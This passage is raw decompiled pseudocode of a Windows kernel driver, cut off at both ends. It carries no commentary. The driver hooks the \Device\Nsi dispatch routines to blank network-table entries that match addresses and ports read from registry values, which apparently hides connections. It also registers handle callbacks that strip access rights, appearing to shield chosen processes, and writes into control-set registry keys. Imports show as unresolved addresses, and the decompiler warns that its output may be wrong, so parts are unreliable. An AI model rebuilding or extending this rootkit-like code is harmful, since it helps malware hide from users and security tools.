  *((_QWORD *)v11 + 1) = v13;
  *v13 = v11;
  *(_QWORD *)(a4 + 8) = v11;
  MEMORY[0xE641800036822](a4, a3, v12, a4 + 16);
  *a5 = *((_DWORD *)v11 + 4);
  return 0LL;
}


// Function: sub_5064 at 0x5064
// attributes: thunk
__int64 __fastcall sub_5064(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  return sub_4F54(a1, a2, a3, a4, a5, a6);
}


// Function: sub_506C at 0x506C
char __fastcall sub_506C(_DWORD a1, _DWORD a2, __int64 a3, __int64 **a4)
{
  char v5; // bl
  __int64 v7; // rdx
  __int64 *i; // rax
  unsigned __int16 v9; // cx
  bool v10; // zf

  v5 = 0;
  MEMORY[0x6001606000E2202](a3, a4, a3, a4 + 2);
  for ( i = *a4; i != (__int64 *)a4; i = (__int64 *)*i )
  {
    v7 = *((unsigned int *)i + 5);
    v9 = *((_WORD *)i + 12);
    if ( (_DWORD)v7 )
    {
      if ( v9 && *(_WORD *)(a3 + 4) != v9 )
        continue;
      v10 = *(_DWORD *)a3 == (_DWORD)v7;
    }
    else
    {
      if ( !v9 )
        continue;
      v10 = *(_WORD *)(a3 + 4) == v9;
    }
    if ( v10 )
    {
      v5 = 1;
      break;
    }
  }
  MEMORY[0xE641800036822](a3, a4, v7, a4 + 2);
  return v5;
}


// Function: sub_50EC at 0x50EC
__int64 __fastcall sub_50EC(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v4; // ebx

  if ( a4 == 0x90300000C46ALL )
  {
    return (unsigned int)sub_531C();
  }
  else
  {
    v4 = 0;
    *(_QWORD *)(a3 + 56) = 0LL;
    *(_DWORD *)(a3 + 48) = 0;
    MEMORY[0xB340A06001602](a1, a2, 0LL, a3);
  }
  return v4;
}


// Function: sub_5124 at 0x5124
__int64 __fastcall sub_5124(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rsi
  int *v7; // rdi
  __int64 v8; // r14
  unsigned __int64 v9; // r15
  __int64 v10; // rdx
  int v11; // ebp
  __int64 v12; // rax
  int v14; // [rsp+20h] [rbp-68h] BYREF
  __int16 v15; // [rsp+24h] [rbp-64h]
  _BYTE v16[48]; // [rsp+28h] [rbp-60h] BYREF

  v5 = a5;
  if ( *(int *)(a3 + 48) >= 0 )
  {
    v7 = *(int **)(a3 + 112);
    if ( (unsigned __int8)MEMORY[0xA6419000B7419](v7, a5, a3, *((_QWORD *)v7 + 5)) )
    {
      if ( *((_QWORD *)v7 + 6) == 56LL )
      {
        v8 = *((_QWORD *)v7 + 5);
        v9 = *((_QWORD *)v7 + 13);
        MEMORY[0x500BB212000E3412](v7, v5, v16, v5);
        v11 = 0;
        if ( v9 )
        {
          v5 = 0LL;
          v7 = (int *)(v8 + 32);
          do
          {
            v15 = *((_WORD *)v7 - 1);
            v14 = *v7;
            if ( sub_506C((_DWORD)v7, v5, (__int64)&v14, (__int64 **)&qword_A110) )
            {
              v12 = v8 + 56 * v5;
              *(_OWORD *)v12 = 0LL;
              *(_OWORD *)(v12 + 16) = 0LL;
              *(_OWORD *)(v12 + 32) = 0LL;
              *(_QWORD *)(v12 + 48) = 0LL;
            }
            ++v11;
            v7 += 14;
            v5 = v11;
          }
          while ( v11 < v9 );
        }
        MEMORY[0x600160100030402](v7, v5, v10, v16);
      }
    }
  }
  if ( *(_BYTE *)(a3 + 65) )
    *(_BYTE *)(*(_QWORD *)(a3 + 184) + 3LL) |= 1u;
  return 0LL;
}


// Function: sub_5220 at 0x5220
__int64 __fastcall sub_5220(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rsi
  _DWORD *v7; // rdi
  __int64 v8; // r14
  unsigned __int64 v9; // r15
  __int64 v10; // rdx
  int v11; // ebp
  __int64 v12; // rax
  int v14; // [rsp+20h] [rbp-68h] BYREF
  __int16 v15; // [rsp+24h] [rbp-64h]
  _BYTE v16[48]; // [rsp+28h] [rbp-60h] BYREF

  v5 = a5;
  if ( *(int *)(a3 + 48) >= 0 )
  {
    v7 = *(_DWORD **)(a3 + 112);
    if ( (unsigned __int8)MEMORY[0xA6419000B7419](v7, a5, a3, (unsigned int)v7[6]) )
    {
      if ( v7[7] == 56 )
      {
        v8 = (unsigned int)v7[6];
        v9 = (unsigned int)v7[14];
        MEMORY[0x500BB212000E3412](v7, v5, v16, v5);
        v11 = 0;
        if ( v9 )
        {
          v5 = 0LL;
          v7 = (_DWORD *)(v8 + 32);
          do
          {
            v15 = *((_WORD *)v7 - 1);
            v14 = *v7;
            if ( sub_506C((_DWORD)v7, v5, (__int64)&v14, (__int64 **)&qword_A110) )
            {
              v12 = v8 + 56 * v5;
              *(_OWORD *)v12 = 0LL;
              *(_OWORD *)(v12 + 16) = 0LL;
              *(_OWORD *)(v12 + 32) = 0LL;
              *(_QWORD *)(v12 + 48) = 0LL;
            }
            ++v11;
            v7 += 14;
            v5 = v11;
          }
          while ( v11 < v9 );
        }
        MEMORY[0x600160100030402](v7, v5, v10, v16);
      }
    }
  }
  if ( *(_BYTE *)(a3 + 65) )
    *(_BYTE *)(*(_QWORD *)(a3 + 184) + 3LL) |= 1u;
  return 0LL;
}


// Function: sub_531C at 0x531C
void __fastcall sub_531C(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  int v5; // ecx
  __int64 v6; // rax
  __int64 v7; // rcx
  __int64 (__fastcall *v8)(__int64, __int64, __int64, __int64, __int64); // rcx
  __int64 v9; // rdx
  __int64 v10; // rax
  __int64 v11; // rcx

  v3 = *(_QWORD *)(a3 + 184);
  if ( *(_DWORD *)(v3 + 24) == 1179675 )
  {
    v5 = *(_DWORD *)(v3 + 16);
    if ( v5 == 112 )
    {
      v6 = MEMORY[0x8120200004204]();
      v7 = *(_QWORD *)(a3 + 184);
      *(_OWORD *)(v7 - 72) = *(_OWORD *)v7;
      *(_OWORD *)(v7 - 56) = *(_OWORD *)(v7 + 16);
      *(_OWORD *)(v7 - 40) = *(_OWORD *)(v7 + 32);
      *(_QWORD *)(v7 - 24) = *(_QWORD *)(v7 + 48);
      *(_BYTE *)(v7 - 69) = 0;
      v8 = sub_5124;
LABEL_4:
      v9 = v6;
      v10 = *(_QWORD *)(a3 + 184);
      *(_QWORD *)(v10 - 16) = v8;
      *(_QWORD *)(v10 - 8) = v9;
      *(_BYTE *)(v10 - 69) = -32;
      goto LABEL_8;
    }
    if ( v5 == 60 )
    {
      v6 = MEMORY[0x8120200004204]();
      v11 = *(_QWORD *)(a3 + 184);
      *(_OWORD *)(v11 - 72) = *(_OWORD *)v11;
      *(_OWORD *)(v11 - 56) = *(_OWORD *)(v11 + 16);
      *(_OWORD *)(v11 - 40) = *(_OWORD *)(v11 + 32);
      *(_QWORD *)(v11 - 24) = *(_QWORD *)(v11 + 48);
      *(_BYTE *)(v11 - 69) = 0;
      v8 = sub_5220;
      goto LABEL_4;
    }
  }
  ++*(_BYTE *)(a3 + 67);
  *(_QWORD *)(a3 + 184) = v3 + 72;
LABEL_8:
  JUMPOUT(0xF018521C000C341CLL);
}


// Function: sub_53F8 at 0x53F8
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_53F8(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8)
{
  __int64 result; // rax
  __int64 v10; // rdx
  int v11; // eax
  __int64 v12; // rdx
  __int64 v13; // rdi
  __int64 v14; // rdx
  _BYTE v15[24]; // [rsp+40h] [rbp-18h] BYREF

  a8 = 0LL;
  MEMORY[0x5002300360047005](a1, a2, L"\\Device\\Nsi", v15);
  result = MEMORY[0x7010C012D014E016](a1, a2, 2032127LL, v15, &a8, &qword_A070);
  if ( (int)result >= 0 )
  {
    MEMORY[0x60000077C4](a1, a2, v10, a8);
    memset64((void *)(a4 + 112), (unsigned __int64)sub_50EC, 0x1BuLL);
    result = MEMORY[0x80F027006720A](a4 + 328, a2, 0LL, a4, 0LL, 34LL);
    if ( (int)result >= 0 )
    {
      MEMORY[0x90300000C49A] |= 0x10u;
      v11 = MEMORY[0x60B060200060A02](a4 + 328, a2, 0xCB7800000000LL, 0x90300000C46ALL, &qword_A068);
      v13 = (unsigned int)v11;
      if ( v11 < 0 )
      {
        MEMORY[0x700B320F0006340F]((unsigned int)v11, a2, v12, 0x90300000C46ALL);
        qword_A060 = 0LL;
        MEMORY[0x60000077C4](v13, a2, v14, 0xCB7800000000LL);
        qword_A070 = 0LL;
      }
      return (unsigned int)v13;
    }
  }
  return result;
}


// Function: sub_5504 at 0x5504
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_5504(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        char a9)
{
  int v11; // edx
  int v12; // r8d
  int v13; // r9d
  __int64 *v14; // rbx
  __int64 v15; // rdi
  __int64 v16; // rdx
  __int64 v17; // r8
  __int64 v18; // r9
  __int64 result; // rax
  int v20; // edx
  int v21; // r8d
  int v22; // r9d
  unsigned int v23; // ebx
  __int64 v24; // [rsp+0h] [rbp-48h]
  __int64 v25; // [rsp+0h] [rbp-48h]
  __int64 v26; // [rsp+8h] [rbp-40h]
  __int64 v27; // [rsp+8h] [rbp-40h]

  dword_A120 = 1;
  qword_A128 = 0LL;
  dword_A130 = 50526;
  qword_A118 = (__int64)&qword_A110;
  qword_A110 = 50480LL;
  MEMORY[0x700B320F0006340F](a1, a3, 50527LL, &unk_A138, 0LL);
  dword_A158 = 1;
  v14 = qword_A058;
  v15 = 0LL;
  while ( *((_WORD *)v14 + 2) || *(_DWORD *)v14 )
  {
    sub_4F54(v15, a3, (int)&a9, (int)&qword_A058[v15], v12, v13);
    v15 = (unsigned int)(v15 + 1);
    ++v14;
  }
  sub_55E8(v15, a3, v11, a3, v12, v13);
  result = sub_53F8(v15, a3, v16, a4, v17, v18, v24, v26);
  v23 = result;
  if ( (int)result >= 0 )
  {
    byte_A050 = 1;
  }
  else
  {
    sub_56B0(v15, a3, v20, (unsigned int)&qword_A110, v21, v22, v25, v27);
    return v23;
  }
  return result;
}


// Function: sub_55E8 at 0x55E8
__int64 __fastcall sub_55E8(
        __int64 a1,
        __int64 a2,
        _DWORD a3,
        int a4,
        _DWORD a5,
        _DWORD a6,
        __int64 a7,
        unsigned int a8,
        char a9,
        __int64 a10)
{
  __int64 v10; // rdx
  __int64 v11; // r8
  __int64 v12; // r9
  __int64 v13; // rcx
  unsigned int v14; // eax
  __int16 v15; // bx
  int v16; // eax
  int v18; // [rsp+0h] [rbp-30h]
  int v19; // [rsp+8h] [rbp-28h]
  unsigned __int16 *v20; // [rsp+20h] [rbp-10h] BYREF

  v20 = 0LL;
  a8 = 0;
  if ( (int)sub_1898(a1, a2, (__int64)L"Parameters6", a4, (__int64 *)&v20, &a8) < 0 )
    return 0LL;
  if ( a8 >= 0x24 )
  {
    v13 = (__int64)v20;
    v14 = a8 - 2;
    a8 -= 2;
    v15 = 0;
    a2 = *v20;
    a1 = (__int64)(v20 + 1);
    if ( !(_WORD)a2 )
      goto LABEL_11;
    while ( v14 >= 0x22 )
    {
      a10 = 0LL;
      a8 = v14 - 34;
      v16 = sub_41F0(a1, a2, v10, a1, v11, v12, v18, v19);
      v10 = *(unsigned __int16 *)(a1 + 32);
      LOWORD(v10) = *(unsigned __int8 *)(a1 + 33) | (unsigned __int16)((_WORD)v10 << 8);
      LODWORD(a10) = v16;
      WORD2(a10) = v10;
      if ( v16 || (_WORD)v10 )
      {
        sub_4F54(a1, a2, (int)&a9, (int)&a10, v11, v12);
        a1 += 34LL;
      }
      if ( (unsigned __int16)++v15 >= (unsigned __int16)a2 )
        break;
      v14 = a8;
    }
  }
  v13 = (__int64)v20;
LABEL_11:
  if ( v13 )
    sub_1B84(a1, a2, v10, v13);
  return 0LL;
}


// Function: sub_56B0 at 0x56B0
__int64 __fastcall sub_56B0(__int64 a1, __int64 a2, __int64 a3, _QWORD **a4)
{
  __int64 v5; // rdx
  _QWORD *v6; // rdi
  _QWORD *v7; // rdx
  _QWORD *v8; // rcx
  _QWORD *v9; // rax

  MEMORY[0x6001606000E2202](a1, a2, a3, a4 + 2);
  v6 = *a4;
  while ( v6 != a4 )
  {
    v7 = (_QWORD *)*v6;
    v8 = v6;
    v6 = v7;
    if ( (_QWORD *)v7[1] != v8 || (v9 = (_QWORD *)v8[1], (_QWORD *)*v9 != v8) )
      __fastfail(3u);
    *v9 = v7;
    v7[1] = v9;
    MEMORY[0x13640F06530602](v7, a2, 1162433358LL);
  }
  MEMORY[0xE641800036822](v6, a2, v5, a4 + 2);
  return 0LL;
}


// Function: sub_5724 at 0x5724
__int64 __fastcall sub_5724(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v8; // r9d
  __int64 v10; // [rsp+0h] [rbp-28h]
  __int64 v11; // [rsp+8h] [rbp-20h]
  __int64 v12; // [rsp+10h] [rbp-18h]

  if ( (unsigned __int8)sub_584C(a3, a2, a4, (unsigned int)&qword_A0B0, a5, a6) )
    return 3221227288LL;
  else
    return sub_576C(a3, a2, a4, (unsigned int)&qword_A0B0, a3, v8, v10, v11, v12);
}


// Function: sub_576C at 0x576C
__int64 __fastcall sub_576C(_DWORD a1, _DWORD a2, char *a3, __int64 a4, _DWORD *a5)
{
  char *v6; // rdi
  __int64 v9; // rax
  __int64 v10; // rdx
  __int64 v11; // rbx
  __int64 v12; // rdx
  char v13; // al
  __int64 v14; // rdx
  __int64 *v15; // rax

  v6 = a3;
  if ( !a3 )
    return 3221225485LL;
  v9 = MEMORY[0x81E1A50023003](a3, a4, 56LL, 0LL, 1162363471LL);
  v11 = v9;
  if ( !v9 )
    return 3221225626LL;
  *(_OWORD *)v9 = 0LL;
  *(_OWORD *)(v9 + 16) = 0LL;
  *(_OWORD *)(v9 + 32) = 0LL;
  *(_QWORD *)(v9 + 48) = 0LL;
  MEMORY[0x6001606000E2202](v6, a4, v10, a4 + 16);
  *(_DWORD *)(v11 + 16) = (*(_DWORD *)(a4 + 72))++;
  v12 = v11 + 20 - (_QWORD)v6;
  do
  {
    v13 = *v6;
    v6[v12] = *v6;
    ++v6;
  }
  while ( v13 );
  sub_76FD(v6);
  v15 = *(__int64 **)(a4 + 8);
  if ( *v15 != a4 )
    __fastfail(3u);
  *(_QWORD *)v11 = a4;
  *(_QWORD *)(v11 + 8) = v15;
  *v15 = v11;
  *(_QWORD *)(a4 + 8) = v11;
  MEMORY[0xE641800036822](v6, a4, v14, a4 + 16);
  *a5 = *(_DWORD *)(v11 + 16);
  return 0LL;
}


// Function: sub_584C at 0x584C
char __fastcall sub_584C(_DWORD a1, _DWORD a2, __int64 a3, _QWORD **a4)
{
  __int64 v5; // rdi
  __int64 v6; // rdx
  __int64 v7; // rdx
  _QWORD *i; // rbx
  _OWORD v10[2]; // [rsp+20h] [rbp-48h] BYREF

  v5 = 0LL;
  memset(v10, 0, sizeof(v10));
  sub_76F7(0LL, a4, 32LL, v10, a3);
  sub_76FD(0LL);
  MEMORY[0x6001606000E2202](0LL, a4, v6, a4 + 2);
  for ( i = *a4; i != a4; i = (_QWORD *)*i )
  {
    if ( sub_7703(0LL, a4, v10, (char *)i + 20) )
    {
      LOBYTE(v5) = 1;
      break;
    }
  }
  MEMORY[0xE641800036822](v5, a4, v7, a4 + 2);
  return v5;
}


// Function: sub_58EC at 0x58EC
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_58EC(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  int v6; // edx
  int v7; // r8d
  int v8; // r9d
  __int64 v9; // rdx
  __int64 (__fastcall *v10)(); // rdx
  __int64 i; // rax
  __int64 v12; // rcx
  __int64 v13; // rdi
  __int64 v14; // rsi
  __int64 result; // rax
  int v16; // edx
  int v17; // r8d
  int v18; // r9d
  unsigned int v19; // ebx
  __int128 v20; // [rsp+20h] [rbp-E0h] BYREF
  __int128 v21; // [rsp+30h] [rbp-D0h]
  __int64 *v22; // [rsp+40h] [rbp-C0h]
  __int64 v23; // [rsp+50h] [rbp-B0h] BYREF
  __int128 v24; // [rsp+58h] [rbp-A8h]
  __int64 v25; // [rsp+68h] [rbp-98h]
  __int64 v26; // [rsp+70h] [rbp-90h]
  __int128 v27; // [rsp+78h] [rbp-88h]
  __int64 v28; // [rsp+88h] [rbp-78h]
  int v29; // [rsp+90h] [rbp-70h] BYREF
  unsigned int v30[71]; // [rsp+94h] [rbp-6Ch] BYREF

  dword_A0C0 = 1;
  qword_A0C8 = 0LL;
  dword_A0D0 = 0;
  v25 = 0LL;
  v28 = 0LL;
  v22 = 0LL;
  qword_A0B8 = (__int64)&qword_A0B0;
  qword_A0B0 = 0LL;
  v24 = 0LL;
  v27 = 0LL;
  v20 = 0LL;
  v21 = 0LL;
  MEMORY[0x700B320F0006340F](a4, a2, 1LL, qword_A0D8, 0LL);
  dword_A0F8 = 1;
  sub_5AB8(a4, a2, v6, a3, v7, v8);
  sub_7AF0(a4, a2, 0LL, v30, 280LL);
  v29 = 284;
  MEMORY[0xE011521500083415](a4, a2, v9, &v29);
  v10 = sub_5B54;
  if ( v30[0] > 6 )
    v10 = sub_5BBC;
  for ( i = *(_QWORD *)(a4 + 8); i; i = *(_QWORD *)(i + 16) )
  {
    v12 = *(_QWORD *)(i + 64);
    if ( v12 )
    {
      if ( !*(_DWORD *)v12 )
      {
        **(_QWORD **)(v12 + 24) = v10;
        v10 = *(__int64 (__fastcall **)())(v12 + 32);
      }
      break;
    }
  }
  LODWORD(v24) = v24 | 3;
  LODWORD(v27) = v27 | 3;
  v23 = 0x60F0606000C1802LL;
  *((_QWORD *)&v24 + 1) = v10;
  *((_QWORD *)&v27 + 1) = v10;
  v26 = 0x680122006A3422LL;
  MEMORY[0x5002300360047005](a4, a2, L"1000", (char *)&v20 + 8);
  v13 = *(_QWORD *)(a4 + 40);
  *((_QWORD *)&v21 + 1) = 0LL;
  v22 = &v23;
  LODWORD(v20) = 131328;
  v14 = *(unsigned int *)(v13 + 104);
  *(_DWORD *)(v13 + 104) |= 0x20u;
  result = MEMORY[0x600160200060A02](v13, v14, byte_A078, &v20);
  v19 = result;
  if ( (int)result >= 0 )
  {
    *(_DWORD *)(v13 + 104) = v14;
    byte_A080 = 1;
  }
  else
  {
    sub_5C48(v13, v14, v16, (unsigned int)&qword_A0B0, v17, v18);
    return v19;
  }
  return result;
}


// Function: sub_5AB8 at 0x5AB8
__int64 __fastcall sub_5AB8(
        __int64 a1,
        __int64 a2,
        _DWORD a3,
        int a4,
        _DWORD a5,
        _DWORD a6,
        __int64 a7,
        unsigned int a8,
        char a9,
        unsigned __int16 *a10)
{
  __int64 v10; // rdx
  int v11; // r8d
  int v12; // r9d
  __int64 v13; // rcx
  unsigned int v14; // eax
  int v15; // ebx

  a10 = 0LL;
  a8 = 0;
  if ( (int)sub_1898(a1, a2, (__int64)L"Parameters7", a4, (__int64 *)&a10, &a8) < 0 )
    return 0LL;
  if ( a8 >= 0x22 )
  {
    v13 = (__int64)a10;
    v14 = a8 - 2;
    a8 -= 2;
    a1 = 0LL;
    a2 = *a10;
    v15 = (_DWORD)a10 + 2;
    if ( !(_WORD)a2 )
      goto LABEL_8;
    while ( v14 >= 0x20 )
    {
      a8 = v14 - 32;
      sub_5724(a1, a2, (int)&a9, v15, v11, v12);
      v15 += 32;
      LOWORD(a1) = a1 + 1;
      if ( (unsigned __int16)a1 >= (unsigned __int16)a2 )
        break;
      v14 = a8;
    }
  }
  v13 = (__int64)a10;
LABEL_8:
  if ( v13 )
    sub_1B84(a1, a2, v10, v13);
  return 0LL;
}


// Function: sub_5B54 at 0x5B54
__int64 __fastcall sub_5B54(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v6; // rax

  v4 = *(_QWORD *)(a3 + 16);
  if ( v4 == MEMORY[0x680122006A3422] )
  {
    v5 = MEMORY[0x7006320A0007340A](a1, a2, a3, *(_QWORD *)(a3 + 8));
  }
  else
  {
    if ( v4 != MEMORY[0x60F0606000C1802] )
      return 0LL;
    v5 = *(_QWORD *)(a3 + 8);
  }
  v6 = MEMORY[0x696060A000E1C02](a1, a2, a3, v5);
  if ( sub_584C(a1, a2, v6, (_QWORD **)&qword_A0B0) && *(_DWORD *)a3 == 1 )
    **(_DWORD **)(a3 + 32) &= ~1u;
  return 0LL;
}


// Function: sub_5BBC at 0x5BBC
__int64 __fastcall sub_5BBC(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v6; // rax
  _DWORD *v7; // rdx
  int v8; // ecx

  v4 = *(_QWORD *)(a3 + 16);
  if ( v4 == MEMORY[0x680122006A3422] )
  {
    v5 = MEMORY[0x7006320A0007340A](a1, a2, a3, *(_QWORD *)(a3 + 8));
  }
  else
  {
    if ( v4 != MEMORY[0x60F0606000C1802] )
      return 0LL;
    v5 = *(_QWORD *)(a3 + 8);
  }
  v6 = MEMORY[0x696060A000E1C02](a1, a2, a3, v5);
  if ( sub_584C(a1, a2, v6, (_QWORD **)&qword_A0B0) && *(_DWORD *)a3 == 1 )
  {
    v7 = *(_DWORD **)(a3 + 32);
    v8 = v7[1];
    if ( ((v8 - 1) & 0xFFFFEBFF) == 0 && v8 != 1025 )
      *v7 = 0;
    if ( v8 == 4161 )
      **(_DWORD **)(a3 + 32) = 2031616;
  }
  return 0LL;
}


// Function: sub_5C48 at 0x5C48
__int64 __fastcall sub_5C48(__int64 a1, __int64 a2, __int64 a3, _QWORD **a4)
{
  __int64 v5; // rdx
  _QWORD *v6; // rdi
  _QWORD *v7; // rdx
  _QWORD *v8; // rcx
  _QWORD *v9; // rax

  MEMORY[0x6001606000E2202](a1, a2, a3, a4 + 2);
  v6 = *a4;
  while ( v6 != a4 )
  {
    v7 = (_QWORD *)*v6;
    v8 = v6;
    v6 = v7;
    if ( (_QWORD *)v7[1] != v8 || (v9 = (_QWORD *)v8[1], (_QWORD *)*v9 != v8) )
      __fastfail(3u);
    *v9 = v7;
    v7[1] = v9;
    MEMORY[0x13640F06530602](v7, a2, 1162363471LL);
  }
  MEMORY[0xE641800036822](v6, a2, v5, a4 + 2);
  return 0LL;
}


// Function: sub_5CBC at 0x5CBC
__int64 __fastcall sub_5CBC(
        __int64 a1,
        __int64 a2,
        unsigned __int16 *a3,
        __int64 a4,
        unsigned int a5,
        __int64 (__fastcall *a6)(__int64 *, unsigned __int64, _WORD *, __int64, __int64 *, _QWORD))
{
  __int64 v10; // r8
  __int64 *v11; // rdi
  unsigned __int64 v12; // rbx
  unsigned __int64 v13; // rsi
  __int64 v14; // rax
  int v15; // r9d
  unsigned __int16 v16; // dx
  __int64 result; // rax
  __int64 v18; // rax
  int v19; // r9d
  int v20; // ebx
  __int64 v21; // [rsp+20h] [rbp-40h] BYREF
  _WORD v22[2]; // [rsp+28h] [rbp-38h] BYREF
  int v23; // [rsp+2Ch] [rbp-34h]
  __int64 v24; // [rsp+30h] [rbp-30h]
  __int128 v25; // [rsp+38h] [rbp-28h] BYREF
  __int128 v26; // [rsp+48h] [rbp-18h] BYREF

  v25 = 0LL;
  v23 = 0;
  v26 = 0LL;
  v21 = 0LL;
  MEMORY[0x5002300360047005](a1, a2, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet", &v25);
  LOBYTE(v10) = 1;
  if ( !(unsigned __int8)MEMORY[0x655060100060A02](a1, a2, a3, &v25, v10) )
    return 0LL;
  v11 = (__int64 *)(a3 + 4);
  v12 = *a3;
  v13 = (unsigned __int16)v25 + 2LL;
  if ( v12 >= v13 && *(_WORD *)(*v11 + 2 * ((unsigned __int64)(unsigned __int16)v25 >> 1)) != 92 )
    return 0LL;
  v14 = MEMORY[0x81E1A50023003](v11, v13, *a3, 0LL, 1179806790LL);
  v16 = *a3;
  v24 = v14;
  v22[0] = 0;
  v22[1] = v16;
  if ( !v14 )
    return 3221225495LL;
  if ( v12 < v13 )
  {
    MEMORY[0x5002300360047005](v11, v13, L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001", v22);
  }
  else
  {
    v18 = *v11;
    LOWORD(v26) = v16 - v25 - 2;
    WORD1(v26) = v26;
    *((_QWORD *)&v26 + 1) = v18 + 2 * (((unsigned __int64)(unsigned __int16)v25 >> 1) + 1);
    sub_67F4(
      (_DWORD)v11,
      v13,
      (unsigned int)L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\%wZ",
      (unsigned int)v22,
      (unsigned int)&v26,
      v15);
  }
  result = a6(v11, v13, v22, a4, &v21, a5);
  if ( (int)result >= 0 )
  {
    if ( v12 < v13 )
      MEMORY[0x5002300360047005](v11, v13, L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002", v22);
    else
      sub_67F4(
        (_DWORD)v11,
        v13,
        (unsigned int)L"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet002\\%wZ",
        (unsigned int)v22,
        (unsigned int)&v26,
        v19);
    v20 = a6(v11, v13, v22, a4, (__int64 *)((char *)&v21 + 4), a5);
    if ( v20 < 0 )
    {
      sub_2C0C(v11, v13, (unsigned int)v21, a4);
      return (unsigned int)v20;
    }
    if ( v24 )
      MEMORY[0x13640F06530602](v11, v13, 1179806790LL);
    return 0LL;
  }
  return result;
}


// Function: sub_5E64 at 0x5E64
__int64 __fastcall sub_5E64(__int64 a1, __int64 a2, unsigned int *a3, unsigned __int16 *a4)
{
  int v6; // ebx

  v6 = sub_2778((int)a3, (__int64)a4, a4, 50104LL, a3, 0);
  if ( v6 >= 0 )
  {
    v6 = sub_5CBC(
           (__int64)a3,
           (__int64)a4,
           a4,
           50104LL,
           *a3,
           (__int64 (__fastcall *)(__int64 *, unsigned __int64, _WORD *, __int64, __int64 *, _QWORD))sub_2778);
    if ( v6 < 0 )
      sub_2C0C(a3, (__int64)a4, *a3, 50104LL);
  }
  return (unsigned int)v6;
}


// Function: sub_5ED4 at 0x5ED4
__int64 __fastcall sub_5ED4(__int64 a1, __int64 a2, unsigned int *a3, unsigned __int16 *a4)
{
  int v6; // ebx

  v6 = sub_2794((int)a3, (__int64)a4, a4, 50124LL, a3, 0);
  if ( v6 >= 0 )
  {
    v6 = sub_5CBC(
           (__int64)a3,
           (__int64)a4,
           a4,
           50124LL,
           *a3,
           (__int64 (__fastcall *)(__int64 *, unsigned __int64, _WORD *, __int64, __int64 *, _QWORD))sub_2794);
    if ( v6 < 0 )
      sub_2C0C(a3, (__int64)a4, *a3, 50124LL);
  }
  return (unsigned int)v6;
}


// Function: sub_5F44 at 0x5F44
// attributes: thunk
__int64 __fastcall sub_5F44(__int64 a1, __int64 a2, unsigned int *a3, unsigned __int16 *a4)
{
  return sub_5E64(a1, a2, a3, a4);
}


// Function: sub_5F4C at 0x5F4C
// attributes: thunk
__int64 __fastcall sub_5F4C(__int64 a1, __int64 a2, unsigned int *a3, unsigned __int16 *a4)
{
  return sub_5ED4(a1, a2, a3, a4);
}


// Function: sub_5F54 at 0x5F54
char __fastcall sub_5F54(
        double a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        __m128 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 a11,
        __int64 a12,
        __int64 a13,
        __int64 a14,
        unsigned __int64 a15,
        __int64 a16)
{
  char v16; // bl
  bool v17; // cc

  a16 = a9;
  v16 = 0;
  v17 = *(_WORD *)a10 <= 2u;
  a15 = 0LL;
  if ( !v17 && **(_WORD **)(a10 + 8) == 92 )
    return sub_2954(a10, a1, a2, a3, a4, a5, a6, a7, 50104LL, (__m128i *)a10, (__int64 **)0xC3B8);
  if ( (int)MEMORY[0xA14027010E012](a10, 50104LL, a11, &qword_A0A0, 0LL, &a15) >= 0 )
    return sub_294C(a10, 50104LL, a15, (_QWORD **)0xC3B8, a10);
  return v16;
}


// Function: sub_5FD0 at 0x5FD0
char __fastcall sub_5FD0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        unsigned __int64 a10)
{
  a9 = 0;
  if ( (int)MEMORY[0xA14027010E012](a1, a2, a4, &qword_A0A0, 0LL, &a10) >= 0 )
    return sub_295C(a1, a2, a10, (_QWORD **)0xC3CC, a3, &a9);
  else
    return 0;
}


// Function: sub_6020 at 0x6020
// write access to const memory has been detected, the output may be wrong!
__int64 sub_6020()
{
  return 3221226021LL;
}


// Function: sub_606C at 0x606C
char __fastcall sub_606C(__int64 a1, __int64 a2, __int16 *a3, int a4, __int64 a5)
{
  __int16 v6; // ax

  if ( a4 )
  {
    if ( a4 != 3 )
      return 0;
    *(_QWORD *)(a5 + 8) = a3 + 2;
    v6 = *a3;
  }
  else
  {
    *(_QWORD *)(a5 + 8) = a3 + 8;
    v6 = a3[6];
  }
  *(_WORD *)(a5 + 2) = v6;
  *(_WORD *)a5 = v6;
  return 1;
}


// Function: sub_60A0 at 0x60A0
char __fastcall sub_60A0(__int64 a1, __int64 a2, __int64 a3, int a4, __int64 a5)
{
  int v5; // ecx
  __int16 v7; // ax

  if ( a4 )
  {
    v5 = a4 - 1;
    if ( v5 && v5 != 2 )
      return 0;
    *(_QWORD *)(a5 + 8) = a3 + 20;
    v7 = *(_WORD *)(a3 + 16);
  }
  else
  {
    *(_QWORD *)(a5 + 8) = a3 + 12;
    v7 = *(_WORD *)(a3 + 8);
  }
  *(_WORD *)(a5 + 2) = v7;
  *(_WORD *)a5 = v7;
  return 1;
}


// Function: sub_60D8 at 0x60D8
// write access to const memory has been detected, the output may be wrong!
